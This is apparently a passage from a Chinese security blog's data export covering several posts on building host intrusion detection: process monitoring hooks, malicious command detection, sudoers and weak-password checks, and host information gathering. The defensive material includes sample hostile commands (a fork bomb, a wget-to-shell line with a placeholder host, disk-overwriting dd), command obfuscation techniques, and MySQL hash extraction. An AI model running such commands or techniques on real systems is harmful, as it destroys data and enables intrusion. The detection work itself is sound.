(*execve_func_t)(const char* filename, char* const argv[], char* const envp[]);\n   static execve_func_t old_execve = NULL;\n   \n   int execve(const char* filename, char* const argv[], char* const envp[]) {\n   printf(\"Running hook\\n\");\n   printf(\"Program executed: %s\\n\", filename);\n   old_execve = dlsym(RTLD_NEXT, \"execve\");\n   return old_execve(filename, argv, envp);\n   }\n   ```\n\n   该文件的主要部分就是重新定义了 `execve`函数，在原始的 `execve`执行之前打印可执行文件的名字。\n\n2. 生成动态链接库：`gcc hook.c-fPIC-shared-o hook.so`\n\n3. 将上面生成的动态链接库注册成 preload ：`echo'/path/to/hook.so'>/etc/ld.so.preload`\n\n4. 退出当前 shell 并重新登录（下面会讲原因），执行命令即可看到我们编写的代码已被执行：\n\n![图片描述](/images/a11/1.png)\n\n## 使用条件\n\n该方法没有什么条件限制，只需有 root 权限即可**（做入侵监控程序 root 权限是必需的，后面的几种方法默认也都是在 root 权限下）**。\n\n## 优缺点\n\n**优点**\n\n- 轻量级，只修改库函数代码，不与内核进行交互。\n\n**缺点**\n\n- 只能影响在 preload 之后创建的进程\n\n- 无法监控静态链接的程序\n- 通过 `int80h`绕过 libc 直接调用系统调用\n\n# Netlink Connector\n\n## 原理\n\nNetlink 是一个套接字家族（socket family），它被用于内核与用户态进程以及用户态进程之间的 IPC 通信，我们常用的 `ss`命令就是通过 Netlink 与内核通信获取的信息。\n\nNetlink Connector 是一种 Netlink ，它的 Netlink 协议号是 `NETLINK_CONNECTOR`，其代码位于 [https://github.com/torvalds/linux/tree/master/drivers/connector](https://link.zhihu.com/?target=https%3A//github.com/torvalds/linux/tree/master/drivers/connector) 中，其中 connectors.c 和 cnqueue.c 是 Netlink Connector 的实现代码，而 cnproc.c 是一个应用实例，名为进程事件连接器，我们可以通过该连接器来实现对进程创建的监控。\n\n![图片描述](/images/a11/2.png)\n\n**具体流程：**\n\n ![图片描述](/images/a11/3.png)\n\n图中的 ncp 为 Netlink Connector Process，即用户态我们需要开发的程序。\n\n## 演示\n\n在 Github 上已有人基于进程事件连接器开发了一个简单的进程监控程序：[https://github.com/ggrandes-clones/pmon/blob/master/src/pmon.c](https://link.zhihu.com/?target=https%3A//github.com/ggrandes-clones/pmon/blob/master/src/pmon.c) ，其核心函数为以下三个：\n\n- `nl_connect`：与内核建立连接\n- `set_proc_ev_listen`：订阅进程事件\n- `handle_proc_ev`：处理进程事件\n\n其执行流程正如上图所示。\n\n我们通过 `gcc pmon.c-o pmon`生成可执行程序，然后执行该程序即可看到效果：\n\n![图片描述](/images/a11/4.png)\n\n获取到的 pid 之后，再去 `/proc/`目录下获取进程的详细信息即可。\n\n## 使用条件\n\n内核支持 Netlink Connector\n\n- 版本 > 2.6.14\n- 内核配置开启： `cat /boot/config-$(uname -r)|egrep 'CONFIG_CONNECTOR|CONFIG_PROC_EVENTS'`\n\n## 优缺点\n\n**优点**\n\n- 轻量级，在用户态即可获得内核提供的信息。\n\n**缺点**\n\n- 仅能获取到 pid ，详细信息需要查 `/proc/`，这就存在时间差，可能有数据丢失。\n\n# Audit\n\nLinux Audit 是 Linux 内核中用来进行审计的组件，可监控系统调用和文件访问。可用来\n\n- Watching file access\n- Monitoring system calls\n- Recording commands run by a user\n- Recording security events\n- Monitoring network access\n\n具体架构如下 :\n\n ![图片描述](/images/a11/5.png)\n\n1. 用户通过用户态的管理进程配置规则（例如图中的 go-audit ，也可替换为常用的 auditd ），并通过 Netlink 套接字通知给内核。\n2. 内核中的 kauditd 通过 Netlink 获取到规则并加载。\n3. 应用程序在调用系统调用和系统调用返回时都会经过 kauditd ，kauditd 会将这些事件记录下来并通过 Netlink 回传给用户态进程。\n4. 用户态进程解析事件日志并输出。\n\n## 演示\n\n从上面的架构图可知，整个框架分为用户态和内核态两部分，内核空间的 kauditd 是不可变的，用户态的程序是可以定制的，目前最常用的用户态程序就是 auditd ，除此之外知名的 [osquery](https://medium.com/palantir/auditing-with-osquery-part-one-introduction-to-the-linux-audit-framework-217967cec406) 在底层也是通过与 Audit 交互来获取进程事件。下面我们就简单介绍一下如何通过 auditd 来监控进程创建。\n\n首先安装并启动 auditd ：\n\n```\napt update && apt install auditd\nsystemctl start auditd && systemctl status auditd\n```\n\nauditd 软件包中含有一个命名行控制程序 `auditctl`，我们可以通过它在命令行中与 auditd 进行交互，用如下命令创建一个对 `execve`这个系统调用的监控：\n\n```\nauditctl -a exit,always -F arch=b64 -S execve\n```\n\n再通过 auditd 软件包中的 `ausearch`来检索 auditd 产生的日志：\n\n```\nausearch -sc execve | grep /usr/bin/id\n```\n\n整个过程的执行结果如下：\n\n![图片描述](/images/a11/6.png)\n\n至于其他的使用方法可以通过 `man auditd`和 `man auditctl`来查看。\n\n## 使用条件\n\n内核开启 Audit\n\n- `cat/boot/config-$(uname-r)|grep^CONFIG_AUDIT`\n\n## 优缺点\n\n**优点**\n\n- 组件完善，使用 auditd 软件包中的工具即可满足大部分需求，无需额外开发代码。\n- 相比于 Netlink Connector ，获取的信息更为全面，不仅仅是 pid 。\n\n**缺点**\n\n- 性能消耗随着进程数量提升有所上升，需要通过添加白名单等配置来限制其资源占用。\n\n**关于性能消耗：**\n\n开启了osquery的审计功能之后,会在两个方面存在性能损耗:\n\n1. 当开启了内核中审计功能之后并且存在审计规则，那么内核每次都会比对审计规则和实际产生的审计事件。\n2. 这个`audit consumer`(在本例中是`osquery`)将会从内核`netlink socket`中接受数据，然后将数据解析为了其内部定义的表的格式(`socket_events`和`process_events`)并保存在早RocksDB中。最后一旦这个数据被查询，那么这个数据就会被写入到文件或者是通过日志插件发送。\n\n每一次在内核中产生系统调用，就会产生相应的审计事件。如果这样的系统调用越多，那么内核产生这些系统调用的审计事件的工作量就越大，同时osquery解析这些审计事件并且保存在数据库中的工作量也越大。\n\n# Syscall hook\n\n上面的 Netlink Connector 和 Audit 都是 Linux 本身提供的监控系统调用的方法，如果我们想拥有更大程度的可定制化，我们就需要通过安装内核模块的方式来对系统调用进行 hook 。\n\n## 原理\n\n目前常用的 hook 方法是通过修改 `sys_call_table`（ Linux 系统调用表）来实现，具体原理就是系统在执行系统调用时是通过系统调用号在 `sys_call_table`中找到相应的函数进行调用，所以只要将 `sys_call_table`中 `execve`对应的地址改为我们安装的内核模块中的函数地址即可。\n\n上述具体的实现细节可参考 YSRC 的这篇关于驭龙 HIDS 如何实现进程监控的文章：[https://mp.weixin.qq.com/s/ntE5FNM8UaXQFC5l4iKUUw](https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/ntE5FNM8UaXQFC5l4iKUUw) ，这里贴出文章里的一张图方便大家对整个流程有个直观地了解：\n\n ![图片描述](/images/a11/7.png)\n\n## 演示\n\n关于 Syscall hook 的 Demo ，我在 Github 上找了很多 Demo 代码，其中就包括驭龙 HIDS 的 hook 模块，但是这些都无法在我的机器上（ Ubuntu 16.04 Kernel 4.4.0-151-generic ）正常运行，这也就暴露了 Syscall hook 的兼容性问题。\n\n最后我决定使用 Sysdig 来进行演示，Sysdig 是一个开源的系统监控工具，其核心原理是通过内核模块监控系统调用，并将系统调用抽象成事件，用户根据这些事件定制检测规则。作为一个相对成熟的产品，Sysdig 的兼容性做得比较好，所以这里用它来演示，同时也可以方便大家自己进行测试。\n\n具体步骤如下：\n\n1.通过官方的安装脚本进行安装：\n\n```shell\ncurl -s https://s3.amazonaws.com/download.draios.com/stable/install-sysdig | sudo bash\n```\n\n2.检测内核模块是否已经安全：`lsmod|grep sysdig`\n\n3.启动对 `execve`的监控：`sysdig evt.type=execve`\n\n最终的执行效果如下：\n\n![图片描述](/images/a11/8.png)\n\n有关于 Sysdig 的更多信息可以访问其 wiki 进行获取，另外，Sysdig 团队推出了一个专门用于安全监控的工具 Falco ，Falco 在 Sysdig 的基础上抽象出了可读性更高的检测规则，并支持在容器内部署，同样，大家如果感兴趣可以访问其 wiki 获取更多信息。\n\n## 使用条件\n\n- 可以安装内核模块。\n- 需针对不同 Linux 发行版和内核版本进行定制。\n\n## 优缺点\n\n**优点**\n\n- 高定制化，从系统调用层面获取完整信息。\n\n**缺点**\n\n- 开发难度大。\n- 兼容性差，需针对不同发行版和内核版本进行定制和测试。\n\n# 总结\n\n本文共讲了4种常见的监控进程创建的方法，这些方法本质上是对库函数或系统调用的监控，各有优劣，这里我再各用一句话总结一下：\n\n```\nSo preload ：Hook 库函数，不与内核交互，轻量但易被绕过。\nNetlink Connector ：从内核获取数据，监控系统调用，轻量，仅能直接获取 pid ，其他信息需要通过读取 proc/<pid>/来补全。\nAudit ：从内核获取数据，监控系统调用，功能多，不只监控进程创建，获取的信息相对全面。\nSyscall hook ：从内核获取数据，监控系统调用，最接近实际系统调用，定制度高，兼容性差。\n```\n\n对我个人来讲，单纯地看监控进程创建这方面，我还是更推荐使用 Netlink Connector 的方式，这种方式在保证从内核获取数据的前提下又足够轻量，方便进行定制化开发。如果是想要进行全方面的监控包括进程、网络和文件，Audit 是一个不错的选择。\n\n\n\n**参考：**\n\nhttps://blog.csdn.net/whuzm08/article/details/87267956\n\nhttps://blog.spoock.com/2019/01/13/auditing-with-osquery/\n\nhttps://segmentfault.com/a/1190000019828080\n\n[https://4hou.win/wordpress/?p...](https://4hou.win/wordpress/?p=29586)\n\n[https://tech.meituan.com/2019...](https://tech.meituan.com/2019/01/17/distributed-hids-cluster-architecture-design.html)\n\n[https://www.ibm.com/developer...](https://www.ibm.com/developerworks/cn/linux/l-lo-use-space-audit-tool/index.html)\n\n[https://linux-audit.com/confi...](https://linux-audit.com/configuring-and-auditing-linux-systems-with-audit-daemon/)\n\n[https://my.oschina.net/macwe/...](https://my.oschina.net/macwe/blog/603583)\n\n[https://mp.weixin.qq.com/s/nt...](https://mp.weixin.qq.com/s/ntE5FNM8UaXQFC5l4iKUUw)\n\n[https://mp.weixin.qq.com/s?__...](https://mp.weixin.qq.com/s?__biz=MzUzODQ0ODkyNA==&mid=2247483854&idx=2&sn=815883b02ab0000956959f78c3f31e2b&scene=21)\n\nhttps://github.com/draios/sysdig\n\n[https://github.com/falcosecur...](https://github.com/falcosecurity/falco)","tags":["反入侵","内核监控","audit","netlink","syscall"],"categories":["反入侵策略"]},{"title":"反入侵策略总结-恶意命令检测","url":"/2019/04/09/反入侵策略总结-恶意命令检测/","content":"# Linux命令混淆\n\nLinux shell是脚本语言，有很多变种的执行方式。例如`cat /etc/passwd`就可以改成如下形式：\n\n```shell\ncat $(echo /e)tc$(echo /pa*)wd\n```\n\n其他绕过方式可以查看参考链接\n\n## 混淆方式\n\n根据开源的命令[混淆器](https://github.com/Bashfuscator/Bashfuscator)，来总结下混淆的几种方式。\n\n**五种类型突变：**\n\n1. 命令混淆\n   - 利用Linux环境中的命令或二进制文件行为的简单混淆器\n   - 混淆整个输入在一个块中\n2. 字符混淆\n   - 使用更高级特性/二进制的模糊处理程序\n   - 将输入分解成块，对这些块进行混淆，然后通过串联所有不同混淆块的标准输出来构建输入\n3. token混淆\n   - 利用Bash功能或行为混淆命令\n   - 通常不使用任何外部二进制文件\n   - 混淆整个输入在一个块中\n4. 编码\n   - 对整个输入进行编码，并使用存根对其进行解码。\n5. 压缩\n   - 使用Linux环境中常见的各种压缩器，使用存根压缩并解压缩输入\n\n使用`-l选项`可以列出所有的突变模块，并给出了大小和时间级别、描述等。\n\n**Command Obfuscators:**\n\n​\tName: Case Swapper\n\n​\tDescription: 相互转换所有大小写字符\n\n​\tName: Reverse\n\n​\tDescription: 反转一个命令\n\n**String Obfuscators:**\n\n​\tName: File Glob\n\n​\tDescription: 使用文件和glob排序重新组装字符串\n\n​\tName: Folder Glob\n\n​\tDescription: 使用文件和glob排序重新组装字符串\n\n​\tName: Hex Hash\n\n​\tDescription: 使用md5的输出对字符串进行编码\n\n**Token Obfuscators:**\n\n​\tName: ForCode\n\n​\tDescription: 打乱命令并在一个循环里恢复\n\n​\tName: Special Char Only\n\n​\tDescription: 将命令转换为只使用特殊字符\n\n**Encoders:**\n\n​\tName: Base64\n\n​\tDescription: Base64编码命令\n\n​\tName: RotN\n\n​\tDescription: 在ASCII字符集中将每个字符偏移随机次数\n\n​\tName: Xor Non Null\n\n​\tDescription: 使用perl中的xor运算符对字符串进行编码\n\n**Compressors:**\n\n​\tName: Bzip2\n\n​\tDescription: 使用bzip2压缩命令\n\n​\tName: Gzip\n\n​\tDescription: 使用gzip压缩命令\n\n## bash 调试功能\n\n经常使用shell的，大家都应该知道 sh -x 这个命令，sh其实是bash的软连接，本质上还是调用的bash。sh -x可以打印出shell脚本的运行过程，这样就可以看到真正的执行命令，但是有一点不好，就是它真的会把命令执行起来。**用它作为沙箱不合适，不仅浪费了检测的时间，还有可能被反调试**。\n\n那我们的想法便是使用阉割版的bash，仅把命令打印出来但不执行。实现这一功能需要去修改源码后重新编译。可以参考：https://cloud.tencent.com/developer/article/1369290\n\n# 恶意命令\n\n参考： https://techviral.net/dangerous-linux-commands/\n\n1. `:(){:|:&};:`\n2. `[command] > /dev/sda`\n3. `wget http://malicious.com -O | sh`\n4. `curl -s http://malicious.com`\n5. `dd if=something of=/dev/sda`\n6. `python -c \"[command]\"|perl -e \"[command]\"`\n\n## crontab命令检测\n\n这个信息在信息搜集模块搜集过，只要对每一条crontab匹配规则即可。\n\n## bash命令检测\n\n### 通过源码HOOK\n\n之前也讲过可以使用history命令查看历史记录，但是很容易被绕过，并且搜集不完整。这边提供两种思路搜集命令：\n\n1. 如果服务器是通过跳板机登录的，这个就好办了，跳板机会记录所有机器的操作命令，这样统一扫描就很方便。\n2. 第一种情况在运维环境比较可能，线上环境并非都通过跳板机登录的。这种情况可以上面类似的思路，修改bash源码来进行记录。 具体参考https://blog.51cto.com/koumm/1763145，通过修改bash的源码，把执行的命令通过[syslog](https://www.thegeekdiary.com/linux-os-service-syslog/)发送给服务端 。\n\n第二种情况也存在弊端，一是bash版本需要统一管理（母盘设置，初始化时其他系统继承母盘），二是linux中还存在其他[shell](https://www.jianshu.com/p/bc47aeb4f273)，需要也要hook源码，不然其他shell命令就无法记录了。\n\n### osquery检测逻辑\n\n再看看知名开源hids框架[osquery](https://common.cnblogs.com/editor/tiny_mce/plugins/preview/ https://www.freebuf.com/column/162604.html )是怎么检测的（毕竟facebook官方开源的，很有借鉴意义）：\n\n遍历所有的用户，拿到`uid`，`gid`和`directory`。之后调用`genShellHistoryForUser()`获取用户的shell记录`genShellHistoryFromBashSessions()`和`genShellHistoryForUser()`作用类似。\n\n**genShellHistoryForUser()**:\n\n```c++\nvoid genShellHistoryForUser(const std::string& uid, const std::string& gid, const std::string& directory, QueryData& results) {\n    auto dropper = DropPrivileges::get();\n    if (!dropper->dropTo(uid, gid)) {\n        VLOG(1) << \"Cannot drop privileges to UID \" << uid;\n        return;\n    }\n\n    for (const auto& hfile : kShellHistoryFiles) {\n        boost::filesystem::path history_file = directory;\n        history_file /= hfile;\n        genShellHistoryFromFile(uid, history_file, results);\n    }\n}\n```\n\n可以看到在执行之前调用了:\n\n```c++\nauto dropper = DropPrivileges::get();\nif (!dropper->dropTo(uid, gid)) {\n    VLOG(1) << \"Cannot drop privileges to UID \" << uid;\n    return;\n}\n```\n\n为什么对`gid`和`uid`降权， osquery一般都是使用root权限运行的，如果攻击者在`.bash_history`中注入了一段恶意的shellcode代码。那么当osquery读到了这个文件之后，攻击者就能够获取到root权限了，所以通过降权的方式就能够很好地避免这样的问题。\n\n之后遍历`kShellHistoryFiles`文件，执行`genShellHistoryFromFile()`代码。`kShellHistoryFiles`在之前已经定义，内容是：\n\n```c++\nconst std::vector<std::string> kShellHistoryFiles = {\n    \".bash_history\", \".zsh_history\", \".zhistory\", \".history\", \".sh_history\",\n};\n```\n\n可以发现其实在`kShellHistoryFiles`定义的就是常见的bash用于记录shell history目录的文件。最后调用`genShellHistoryFromFile()`读取`.history`文件，解析数据。\n\n```java\nvoid genShellHistoryFromFile(const std::string& uid, const boost::filesystem::path& history_file, QueryData& results) {\n    std::string history_content;\n    if (forensicReadFile(history_file, history_content).ok()) {\n        auto bash_timestamp_rx = xp::sregex::compile(\"^#(?P<timestamp>[0-9]+)$\");\n        auto zsh_timestamp_rx = xp::sregex::compile(\"^: {0,10}(?P<timestamp>[0-9]{1,11}):[0-9]+;(?P<command>.*)$\");\n        std::string prev_bash_timestamp;\n        for (const auto& line : split(history_content, \"\\n\")) {\n            xp::smatch bash_timestamp_matches;\n            xp::smatch zsh_timestamp_matches;\n\n            if (prev_bash_timestamp.empty() &&\n                xp::regex_search(line, bash_timestamp_matches, bash_timestamp_rx)) {\n                prev_bash_timestamp = bash_timestamp_matches[\"timestamp\"];\n                continue;\n            }\n\n            Row r;\n\n            if (!prev_bash_timestamp.empty()) {\n                r[\"time\"] = INTEGER(prev_bash_timestamp);\n                r[\"command\"] = line;\n                prev_bash_timestamp.clear();\n            } else if (xp::regex_search(\n                    line, zsh_timestamp_matches, zsh_timestamp_rx)) {\n                std::string timestamp = zsh_timestamp_matches[\"timestamp\"];\n                r[\"time\"] = INTEGER(timestamp);\n                r[\"command\"] = zsh_timestamp_matches[\"command\"];\n            } else {\n                r[\"time\"] = INTEGER(0);\n                r[\"command\"] = line;\n            }\n\n            r[\"uid\"] = uid;\n            r[\"history_file\"] = history_file.string();\n            results.push_back(r);\n        }\n    }\n}\n```\n\n整个代码逻辑非常地清晰。\n\n1. `forensicReadFile(history_file, history_content)`读取文件内容。\n2. 定义`bash_timestamp_rx`和`zsh_timestamp_rx`的正则表达式，用于解析对应的`.history`文件的内容。 `for (const auto& line : split(history_content, \"\\n\"))`读取文件的每一行，分别利用`bash_timestamp_rx`和`zsh_timestamp_rx`解析每一行的内容。\n3. `Row r;...;r[\"history_file\"] = history_file.string();results.push_back(r);`将解析之后的内容写入到Row中返回。\n\n`genShellHistoryFromBashSessions()`获取历史命令的方法比较简单。\n\n1. 获取到`.bash_sessions/*.history`所有的文件；\n2. 同样调用`genShellHistoryFromFile(uid, history_file, results);`方法获取到历史命令；\n\n# 总结\n\n一个检测项可能有多种的是实现方法，没有最好的方法，只有最适合的方法。选择哪种实现方式，还是要根据实际的情况来做衡量。\n\n单项检测可能无法做到尽善尽美，所以HIDS也是一种纵深检测的思路，后续介绍的命令执行检测的策略和bash历史命令检测相辅相成，相互补充。\n\n \n\n**参考：**\n\nhttp://caffeinesecurity.blogspot.com/2011/09/guide-to-malicious-linuxunix-commands.html\n\nhttps://techviral.net/dangerous-linux-commands/\n\nhttps://blog.spoock.com/2018/11/29/osquery-source-analysis-shell-history/\n\n[https://chybeta.github.io/2017/08/15/命令执行的一些绕过技巧/](https://chybeta.github.io/2017/08/15/命令执行的一些绕过技巧/)\n\n[https://www.smi1e.top/命令注入绕过姿势/](https://www.smi1e.top/命令注入绕过姿势/)","tags":["反入侵","命令混淆","history获取"],"categories":["反入侵策略"]},{"title":"反入侵策略总结-基础检测","url":"/2019/04/05/反入侵策略总结-基础检测/","content":"\n# 基线检测\n\n基线检测应该是HIDS最基础的功能，不管是为了合规还是为了等保测试，基线应该说是最基础也是最重要的一项检测。\n\n## Sudoers检测\n\n配置用例： `user1 ALL=(ALL) NOPASSWD: ALL`\n\n[对应含义](https://blog.csdn.net/Field_Yang/article/details/51547804)： `用户 登录的主机=(可以变换的身份) 不需要密码执行: 可以执行的命令`\n\n**归纳五种危险的配置：**\n\n1. **未明确限制可以使用命令白名单的用户**\n\n   `ALL ALL=(root) NOPASSWD:CMD`\n\n   第一个ALL表示所有用户都可以使用申请的命令白命令。 该配置扩大了可以升权的用户范围，存在潜在提权风险。\n\n2. **未明确限制升权后的用户**\n\n   `username ALL=(ALL) NOPASSWD:CMD`\n\n   括号里ALL表示用户可以升权到任意用户（配置成root也是高风险），包括root和其他所有用户。该配置扩大了升权后的用户范围，存在潜在提权风险。\n\n3. **待升权命令的自身访问权限较低，存在被替换风险**\n\n   `user1 ALL=(root) NOPASSWD:/home/user1/test`\n\n   /home/user1/test的自身访问权限为user1。用户获得user1权限后，可以把该命令替换为某个破坏性命令导致提权。\n\n4. **待升权命令仅包含命令，而没有明确参数**\n\n   `username ALL=(root) NOPASSWD:/bin/bash`\n\n   配置了/bin/bash，没有限制对应的参数（执行的脚本），可导致执行任意脚本提权。\n\n5. **待升权命令中使用”\\*”不当**\n\n   `user1 ALL=(root) NOPASSWD:/sbin/ip netns exec qrouter-[0-9a-z]* timeout 5 /sbin/tcpdump -s 60 -c [1-3]*`\n\n   这里申请的命令/sbin/ip，不再是单独的命令，而是加上了参数，但是该参数中使用了通配符”*” 。 ”*”作为通配符，可以匹配任意个字符，包括空格，分号等。所以可以匹配任意命令。\n\n**检测规则：**\n\n1. 上面讲了5条基本的危险配置，可以简单的归结为`(可以变换的身份)`为`root|ALL`，后面为`NOPASSWD`就很可能存在风险。即可提炼出正则规则，配置告警。\n2. 根据实际情况，如果实际业务中上面的误报多，就可以对最后一步命令的进行进一步的监控过滤。可采取白名单或者黑名单命令的形式进行监控，黑名单命令例如：`su`、`sh`·、`rm`等（一切可能会危害系统的命令）。如果是加了参数，就监控参数中是否包含“*”号。\n\n## 不安全的加密算法\n\n1. 不安全的SSH 协议： 检测etc/ssh/sshd_config的Protocal是否支持SSH1\n2. 不安全/etc/shadow加密协议（弱口令检测讲解到）\n\n## 低版本软件\n\n**检测规则：**\n\n1. 根据信息搜集模块搜集到的版本信息，定义漏洞版本的规则，若匹配到规则则告警。包括但不限于：\n   - 内核系统低版本\n   - ssh低版本\n   - 各种DB低版本\n   - nginx低版本\n\n## 三方组件漏洞检测\n\n三方组件一般是检测CVE漏洞， 关于CVE漏洞库的匹配， [OWASP Dependency Check](https://common.cnblogs.com/editor/tiny_mce/plugins/preview/ https://github.com/jeremylong/DependencyCheck )这款工具可以检测，如何嵌入到主机扫描系统中：\n\n- 通过看OWASP Dependency Check源码自己实现类似的检测逻辑或者直接复用它的数据库，不过要定时更新。\n- 上述的逻辑最好是单独的一个模块或者组件，提供一个API接口，主机扫描系统只要输入对应的组件的版本信息，就能得到漏洞的反馈信息。\n\n# 基本检测\n\n## 特权账户检测\n\n**检测规则：**\n\n1. 通过之前的信息搜集模块搜集到的用户信息，判断是否存在uid=0且用户名不为root的特权账户。\n\n## 异常账户检测\n\n**检测规则：**\n\n1. 通过历史登录情况自动总结归纳常用登录账户和地点（或者提供添加白名单功能）\n2. 监控`/var/log/secure`或者`/var/log/auth.log`SSH的登陆情况，若存在成功事件并且用户不在白名单上，则告警。\n\n## 暴力破解检测\n\n**检测规则：**\n\n1. 依旧是就监控`/var/log/secure`或者`/var/log/auth.log`的登陆情况，定义一定的时间内某IP尝试登陆失败的次数大于某个阈值则告警。\n2. 大型互联网的机器可能经常受到攻击，不想每次都告警，可以在1的基础上加上特定条件-**失败多次后存在登陆成功的事件**，则告警。\n\n## 弱口令账户检测\n\n### 系统弱口令\n\nshadow中存放的[密码密文格式](http://www.voidcn.com/article/p-kkjoukbh-qg.html)如下：`$id$salt$encrypted`\n\n其中id是指使用的哈希算法，可取如下值：\n\n| ID   | Method                                                       |\n| ---- | ------------------------------------------------------------ |\n| 1    | MD5                                                          |\n| 2a   | Blowfish (not in mainline glibc; added in some Linux distributions) |\n| 5    | SHA-256 (since glibc 2.7)                                    |\n| 6    | SHA-256 (since glibc 2.7)                                    |\n\n**检测规则：**\n\n1. 查看ID是否为6，不为6告警加密算法强度不够\n2. 定义弱口令字典，根据`编码(hash(\"passwd＋salt\"))`规则加密弱口令字典，和/etc/shadow中的encrypted比较，相等则存在弱口令，代码可参考： https://kknews.cc/code/pyolgke.html\n\n### DB弱口令空口令\n\n#### Mysql\n\nmysql弱口令探测不使用直接连接爆破，而是去爆破存储密码hash文件的user.MYD。\n\n1. 通过mysql进程pid，获取/proc/[mysql_pid]/cwd/mysql/user.MYD，`strings user.MYD`然后解析提取里面的hash值。\n2. mysql加密方式是通过两次SHA1加密`SHA1(SHA1($pass))` ，[python代码](https://blog.csdn.net/xluren/article/details/17539719)实现很简单。\n\n#### 其他DB\n\n常用\n\n```\nMysql\nMongoDB\nPostgresql\nRedis\nMemcached\n```\n\n1. 这几个是常用的数据库，检测逻辑是**主动发起一个连接**，看是否能链接成功，可以检测弱口令以及空口令的情况。\n\n2. 发起连接后，最后都要调用下close，确保连接关闭。\n\n3. Mysql检测文件的方法难检测空口令，可以用这种主动连接的方式进行检测。\n\n实现逻辑参考：https://github.com/y1ng1996/F-Scrack/blob/master/F-Scrack.py\n\n\n\n**参考：**\n\nhttps://blog.csdn.net/pyufftj/article/details/28012219\n\nhttps://zhuanlan.zhihu.com/p/37165658\n\n[https://wiki.silic.wiki/习科旧站:获取mysql中user.myd中hash技巧](https://wiki.silic.wiki/习科旧站:获取mysql中user.myd中hash技巧)\n\nhttps://xz.aliyun.com/t/6172","tags":["反入侵","基线检测","弱口令检测"],"categories":["反入侵策略"]},{"title":"反入侵策略总结-基础信息搜集","url":"/2019/04/01/反入侵策略总结-基础信息搜集/","content":"\n# 前言\n\n本系列文章将对HIDS做个简介，互联网团队自研一个HIDS系统，需要研发、策略、运营。研发和运营将不做介绍，本系列就对HIDS的核心**（安全策略）**做个简单的研究。基本上是根据自己的整理的思维导图做个梳理**（暂时只研究linux的策略）**：\n\n# 介绍\n\n主机入侵检测系统（HIDS）是基于主机的入侵检测系统，部署在需要防护的主机服务器上的代理程序，用于监控和报告系统配置和应用程序活动。一些常见的功能包括日志分析，完整性测试、策略实施和rootkit检测。自研的HIDS可以针对特定用例进行定制，使得安全研究中可以及时方便的构建自定义规则。目前开源的入侵检测系统有大名鼎鼎的ossec、国内开源的yulong以及facebook的osquery。HIDS检测的核心数据包含**命令、网络、文件**三大类型，文件产生进程、进程产生网络。HIDS的各种安全策略都是通过这3种类型进行安全分析而得出的规则。\n\n# 架构\n\n目前大部分的HIDS平台建设主要分三大部分：**终端Agent监控组件，Dashboard控制面板和与SIEM、运维数据等其他平台对接的接口集合**。\n\n**终端Agent组件：**主要作用包括监控文件变更、监控服务器状态、下发一些操作指令等。\n\n**DashBoard：**用来执行一些策略推送、资源管理方面的操作\n\n**MQ && Servers：**用来做负载均衡并吞吐数据到数据库\n\n**Database：**数据库\n\n**SIEM APIs**：用来将HIDS的数据和SIEM做整合\n\n![1](/images/a10/1.png)\n\n# 功能\n\n1. **基础信息收集：**系统版本号、系统用户、web组件、数据库、三方组件包等信息，主要用于CVE漏洞检测以及应急响应。\n2. **日志监控：**主要是登录相关的日志、bash日志以及webserver产生的日志，主用用做异常登录监控、危险命令监控以及基础DOS检测。\n3. **文件监控：**新增文件、敏感权限文件、核心文件变动监控、crontab文件监控，主要用于rookit检测、webshell监控等。\n4. **进程监控：**主要用于木马、反弹shell、rookit等检测。\n5. **流量监控：**主要用于木马，反弹shell等发生网络行为的一些异常监控。\n6. **系统命令监控：**主要用于入侵后命令执行的检测。\n\n# 信息搜集\n\n## 系统基本信息\n\n- **系统版本：**根据操作系统解析相应 `/etc/readhat-release`、`/etc/redhat-release`、`/etc/gentoo-release`文件系统版本信息搜集。\n\n- **keneral信息：**解析`/proc/cmdline`和`/proc/version`\n\n- **用户信息：**通过`/etc/passwd`文件搜集用户信息，剔除nologin的用户\n\n- **进程信息：**通过遍历/proc目录下获取所有的进程信息，取信息参考[/proc目录结构](https://common.cnblogs.com/editor/tiny_mce/plugins/preview/ http://man7.org/linux/man-pages/man5/proc.5.html )\n\n- **环境变量信息**：切换到各个用户，运行以下[命令](https://common.cnblogs.com/editor/tiny_mce/plugins/preview/ https://www.jianshu.com/p/fec33aed017b)。\n\n  - set命令显示当前shell的变量，包括当前用户的变量;\n  - env命令显示当前用户的变量;\n  - export命令显示当前导出成用户变量的shell变量。\n\n- **已登录用户信息：**已登录用户保存在`/var/run/utmp`（对应linux `who`命令），c函数`getutxent`可直接解析此文件获取信息\n\n- **历史登录用户信息：**已登录用户保存在`/var/run/utmp`/（对用linux `last`命令），c函数`getutxent`可直接解析此文件获取信息\n\n- **WEB Server进程信息：**通过监控到的所有的进程信息，筛选出命令行运行了`nginx|httpd|apache|tomcat|weblogic|jboss|jetty`等webserver的信息。通过`/proc/[pid]/cmdline`获取到服务运行的命令行，一般是用于搜集webserver的版本号以及webserver的web代码路径。不同的webserver要通过不同的方法的命令和方法获得，例如nginx可以通过找到nginx的路径运行`nginx –v`获得版本信息，通过读取`/proc/[pid]/cmdline`命令行信息匹配-c的内容或者`/proc/[pid]/cwd`运行目录获取到web文件的路径。\n\n- **数据库信息进程信息：**数据库配置路径和版本的获取方法和web路径获取方法类似。\n\n- **三方组件信息：**三方组件包最常见的就是java的三方组件，获取方法是遍历webservers三方路径下的jar文件。如果是war文件部署，还需要把war包解压，然后再重复上述步骤遍历.jar**文件获取到三方组件的名字和版本号**。另一种更优雅获取组件的方式可能是解析web应用的[pom.xml](https://www.javatpoint.com/maven-pom-xml)文件（并非所有java web应用程序都有），文件里的标签 ``管理着三方组件的信息。\n\n  其他组件的搜集（例如ThinkPHP等框架），主要也就是匹配框架指纹（[可能根据robots.txt文件，可能根据一个文件里的特定内容等）](https://blog.51cto.com/simeon/2115190)这个就需要大家去网上或者自己搭建搜集指纹，可以优先常用cms的识别方法，后期可慢慢优化添加其他框架。\n\n- **crontab信息：**`/etc/crontab`文件保存系统计划任务，`/var/spool/cron/`文件夹保存用户计划任务\n\n  ```c++\n  \"/etc/cron.d/\", // system all\n  \"/var/at/tabs/\", // user mac:lion\n  \"/var/spool/cron/\", // user linux:centos\n  \"/var/spool/cron/crontabs/\", // user linux:debian\n  ```\n\n  上面的路径是[开源HIDS](https://github.com/osquery/osquery)里定义的\n\n- **authorized信息**：遍历所有加目录下的`\".ssh/authorized_keys\",\".ssh/authorized_keys2\"`文件\n\n- **konw_host文件：**遍历所有用户家目录下的`.ssh/known_hosts`文件\n\n- 